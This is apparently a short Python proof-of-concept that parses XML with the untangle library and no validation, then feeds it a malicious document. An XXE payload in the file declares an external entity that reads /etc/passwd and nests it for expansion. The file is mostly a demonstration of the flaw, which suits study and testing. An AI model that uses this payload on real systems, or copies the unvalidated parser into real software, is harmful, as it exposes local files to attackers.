import untangle

def parse_xml(xml_data):
    # This function directly parses XML data without validation
    obj = untangle.parse(xml_data)
    return obj

# Example of a malicious XML input that exploits the vulnerability
malicious_xml = """
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY yxe "&xxe;&xxe;">
]>
<root>
  <data>&yxe;</data>
</root>
"""

# Attempt to parse the malicious XML
try:
    result = parse_xml(malicious_xml)
    print(result)
except Exception as e:
    print(f"Error occurred: {e}")